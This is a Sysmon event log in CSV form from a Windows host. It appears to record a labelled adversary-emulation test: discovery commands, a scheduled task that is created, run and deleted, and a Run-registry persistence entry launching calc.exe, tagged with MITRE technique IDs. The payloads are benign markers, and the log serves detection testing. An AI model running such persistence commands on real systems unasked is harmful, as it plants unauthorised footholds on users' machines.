_ts,ID,Timestamp,EventData,ClientId
1783860510744,1,2026-07-12T12:47:33.7803966Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.523"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7905-000000009a01}"",
 ""ProcessId"": 11584,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.821682Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.542"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ProcessId"": 10884,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7905-000000009a01}"",
 ""ParentProcessId"": ""11584"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.8433513Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.581"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7b05-000000009a01}"",
 ""ProcessId"": 11516,
 ""Image"": ""C:\\Windows\\System32\\whoami.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""whoami - displays logged on user information"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""whoami.exe"",
 ""CommandLine"": ""whoami  "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ParentProcessId"": ""10884"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.89623Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.626"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7c05-000000009a01}"",
 ""ProcessId"": 8216,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -Command Get-Process"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ParentProcessId"": ""10884"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:34.0502398Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.786"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7c05-000000009a01}"",
 ""ProcessId"": 8216,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zs4utjnl.b4y.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:47:06.786"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:46.5799767Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:20.394"",
 ""ProcessGuid"": ""{6bc49a7d-8cd8-6a53-7d05-000000009a01}"",
 ""ProcessId"": 1084,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:46.6108992Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:20.437"",
 ""ProcessGuid"": ""{6bc49a7d-8cd8-6a53-7e05-000000009a01}"",
 ""ProcessId"": 5452,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cd8-6a53-7d05-000000009a01}"",
 ""ParentProcessId"": ""1084"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:46.6559184Z,"{
 ""RuleName"": ""T1053"",
 ""UtcTime"": ""2026-07-12 12:47:20.503"",
 ""ProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ProcessId"": 1320,
 ""Image"": ""C:\\Windows\\system32\\svchost.exe"",
 ""TargetFilename"": ""C:\\Windows\\System32\\Tasks\\TFM-TEC-003"",
 ""CreationUtcTime"": ""2026-07-12 12:47:20.503"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:48.7632221Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:22.991"",
 ""ProcessGuid"": ""{6bc49a7d-8cda-6a53-7f05-000000009a01}"",
 ""ProcessId"": 1048,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:48.798492Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:23.023"",
 ""ProcessGuid"": ""{6bc49a7d-8cdb-6a53-8005-000000009a01}"",
 ""ProcessId"": 7292,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cda-6a53-7f05-000000009a01}"",
 ""ParentProcessId"": ""1048"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:50.969119Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.589"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8105-000000009a01}"",
 ""ProcessId"": 896,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /run /tn \""TFM-TEC-003\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:51.0020487Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.618"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8205-000000009a01}"",
 ""ProcessId"": 5548,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /run /tn \""TFM-TEC-003\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cdd-6a53-8105-000000009a01}"",
 ""ParentProcessId"": ""896"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /run /tn \""TFM-TEC-003\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:51.0379089Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.673"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8305-000000009a01}"",
 ""ProcessId"": 4300,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ParentProcessId"": ""1320"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:53.1118154Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:28.118"",
 ""ProcessGuid"": ""{6bc49a7d-8ce0-6a53-8505-000000009a01}"",
 ""ProcessId"": 10808,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:53.1369585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:28.140"",
 ""ProcessGuid"": ""{6bc49a7d-8ce0-6a53-8605-000000009a01}"",
 ""ProcessId"": 2820,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ce0-6a53-8505-000000009a01}"",
 ""ParentProcessId"": ""10808"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:03.5791966Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:41.535"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8705-000000009a01}"",
 ""ProcessId"": 4928,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:03.6191115Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:41.578"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8805-000000009a01}"",
 ""ProcessId"": 8288,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ced-6a53-8705-000000009a01}"",
 ""ParentProcessId"": ""4928"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /t REG_SZ /d \""C:\\Windows\\System32\\calc.exe\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,13,2026-07-12T12:48:03.6350985Z,"{
 ""RuleName"": ""T1060,RunKey"",
 ""EventType"": ""SetValue"",
 ""UtcTime"": ""2026-07-12 12:47:41.608"",
 ""ProcessGuid"": ""{6bc49a7d-8ced-6a53-8805-000000009a01}"",
 ""ProcessId"": 8288,
 ""Image"": ""C:\\Windows\\system32\\reg.exe"",
 ""TargetObject"": ""HKU\\S-1-5-21-2237245112-686140129-944090608-1004\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\TFM_T1547_001_test"",
 ""Details"": ""C:\\Windows\\System32\\calc.exe"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
